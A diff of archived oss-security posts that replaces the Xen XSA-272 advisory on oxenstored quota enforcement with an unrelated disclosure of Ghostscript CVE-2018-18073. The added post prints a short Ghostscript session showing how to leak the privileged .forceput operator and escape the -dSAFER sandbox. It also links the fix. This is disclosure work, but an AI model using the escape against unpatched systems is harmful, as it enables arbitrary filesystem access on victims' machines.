@@ -1,158 +1,48 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/08/14/13
-Message-Id: <E1fpcyl-0001qx-Dd@xenbits.xenproject.org>
-Date: Tue, 14 Aug 2018 17:19:35 +0000
-From: Xen.org security team <security@....org>
-To: xen-announce@...ts.xen.org, xen-devel@...ts.xen.org, xen-users@...ts.xen.org, oss-security@...ts.openwall.com
-CC: Xen.org security team <security-team-members@....org>
-Subject: Xen Security Advisory 272 v2 - oxenstored does not apply quota-maxentity
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/10/10/12
+Message-ID: <CAJ_zFk+W_v0K2UuOF-Oi1a9GB5dDt4K4T_X=hhJycDcE7n=yLA@mail.gmail.com>
+Date: Wed, 10 Oct 2018 11:01:47 -0700
+From: Tavis Ormandy <taviso@...gle.com>
+To: oss-security@...ts.openwall.com
+Subject: ghostscript: saved execution stacks can leak operator arrays (CVE-2018-18073)
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Hello, this <https://bugs.chromium.org/p/project-zero/issues/detail?id=1690>
+is another (different from CVE-2018-17961) -dSAFER sandbox escape.
 
-                    Xen Security Advisory XSA-272
-                              version 2
+There are a whole bunch of different stacks in postscript, there's the
+operand stack, the dict stack, the execution stack, and so on.
 
-               oxenstored does not apply quota-maxentity
+When the error handler is invoked in postscript, part of the execution
+context is passed to the handler so that it can examine what went wrong.
+That context is called `$error`, and could have included parts of
+executeonly routines, and therefore could leak references to system
+operators.
 
-UPDATES IN VERSION 2
-====================
+$ gs -dSAFER -sDEVICE=ppmraw
+GS>{ null .setglobal } stopped clear
+GS>$error /estack get ==
+[...  {-dict- /FontDirectory --.currentglobal-- {-dict-}
+{/LocalFontDirectory --.systemvar--} --ifelse-- --.forceput-- --pop--}]
 
-Ammend patch to reference XSA-272 in the commit message.
+Notice the .forceput in there...
 
-Public release.
+GS>$error /estack get 29 get ==
+{-dict- /FontDirectory --.currentglobal-- {-dict-} {/LocalFontDirectory
+--.systemvar--} --ifelse-- --.forceput-- --pop--}
+GS>$error /estack get 29 get 6 get ==
+--.forceput--
+GS>
 
-ISSUE DESCRIPTION
-=================
+Once you have a reference to forceput, you can do anything you like, see
+the exploit for CVE-2018-18073 as an example of abusing forceput to get
+arbitrary filesystem access.
 
-The logic in oxenstored for handling writes depended on the order of
-evaluation of expressions making up a tuple.
+The fix is public now, this is the commit to fix it:
 
-As indicated in section 7.7.3 "Operations on data structures" of the
-OCaml manual:
+http://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=34cc326eb2c5695833361887fe0b32e8d987741c
 
-  http://caml.inria.fr/pub/docs/manual-ocaml/expr.html
+This was ghostscript bug 699927.
 
-the order of evaluation of subexpressions is not specified.  In
-practice, different implementations behave differently.
+Thanks, Tavis.
 
-IMPACT
-======
-
-oxenstored may not enforce the configured quota-maxentity.
-
-This allows a malicious or buggy guest to write as many xenstore entries
-as it wishes, causing unbounded memory usage in oxenstored.  This can
-lead to a system-wide DoS.
-
-VULNERABLE SYSTEMS
-==================
-
-Xen 4.1 and later are potentially vulnerable.
-
-Only systems using the OCaml xenstored implementation are potentially
-vulnerable.  Systems using the C xenstored implementation are not
-vulnerable.
-
-Whether the compiled oxenstored binary is vulnerable depends on which
-compiler was used.  OCaml can be compiled either as bytecode (with
-ocamlc) or as a native binary (with ocamlopt).
-
-The following OCaml program demonstrates the issue, and identifies
-whether the resulting oxenstored binary will skip the quota enforcement.
-
-  $ cat order.ml
-  let check () =
-    let flag = ref false in
-    let update _ = flag := true; () in
-    List.iter update [1;2;3], !flag
-
-  let main () =
-    let _, flag = check () in
-    if flag then
-    print_endline "This code is not vulnerable!"
-    else
-    print_endline "This code is vulnerable!"
-
-  let () = main ()
-
-  $ ocamlc order.ml -o order.bytecode
-  $ ./order.bytecode
-  This code is vulnerable!
-  $ ocamlopt order.ml -o order.native
-  $ ./order.native
-  This code is not vulnerable!
-
-To confirm whether an OCaml binary is bytecode or native, use file.
-
-  $ file order.bytecode
-  order.bytecode: a /usr/bin/ocamlrun script executable (binary data)
-  $ file order.native
-  order.native: ELF 64-bit LSB executable, ...
-
-NOTE: These results are applicable to OCaml 4.01.0-5 as distributed in
-Debian Jessie.  These results are not representative of other versions
-of OCaml, or of other OS distributions.
-
-MITIGATION
-==========
-
-There are no mitigations available.
-
-CREDITS
-=======
-
-This issue was discovered by Christian Lindig of Citrix.
-
-RESOLUTION
-==========
-
-Applying the appropriate attached patch resolves this issue.
-
-xsa272.patch           All versions of Xen
-
-$ sha256sum xsa272*
-0da953ca48d0cf0688ecff6a074304a9d2217871809a76ef26b9addeb66ecb3e  xsa272.meta
-6e0359d89bf65794f16d39198cc90f5c3137bce4eb850e54625ab00e2c568c2c  xsa272.patch
-$
-
-DEPLOYMENT DURING EMBARGO
-=========================
-
-Deployment of the patches and/or mitigations described above (or
-others which are substantially similar) is permitted during the
-embargo, even on public-facing systems with untrusted guest users and
-administrators.
-
-But: Distribution of updated software is prohibited (except to other
-members of the predisclosure list).
-
-Predisclosure list members who wish to deploy significantly different
-patches and/or mitigations, please contact the Xen Project Security
-Team.
-
-
-(Note: this during-embargo deployment notice is retained in
-post-embargo publicly released Xen Project advisories, even though it
-is then no longer applicable.  This is to enable the community to have
-oversight of the Xen Project Security Team's decisionmaking.)
-
-For more information about permissible uses of embargoed information,
-consult the Xen Project community's agreed Security Policy:
-  http://www.xenproject.org/security-policy.html
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iQEcBAEBCAAGBQJbcw8fAAoJEIP+FMlX6CvZ1VYIALce26h9Sf0P0joLd/fhUwf4
-JcCIaTWvHsy0ucJgpi7i+SCMa7Iz60CriK6dSYlwIuPvka8XU5MDmZ56gbENApDZ
-ibWMwvyCrgb0BH3VIwJZfk7eaKM7OwKeEnnIrIWaVGsT2StwoZOHgdLRLCTSFJ/K
-iss3ALSzZ8z7/WqEkBE3JeJ7skrh5nmNp428fJXWYhOyYbqkqyggn6XzBQg/EzGD
-vabxz4CdYCr1ox7sq42Q/UFeLoWB6CKCLgRgqOGyCrm7K324ymBzRXtXpPUrLEaq
-ugR27W/zr09e8N/fOhH4dBNCzkktuqclwrfMlFr1WUfiltSDmVwNZkURkvVGeu0=
-=TPZD
------END PGP SIGNATURE-----
-
-Download attachment "xsa272.meta" of type "application/octet-stream" (2083 bytes)
-
-Download attachment "xsa272.patch" of type "application/octet-stream" (1271 bytes)
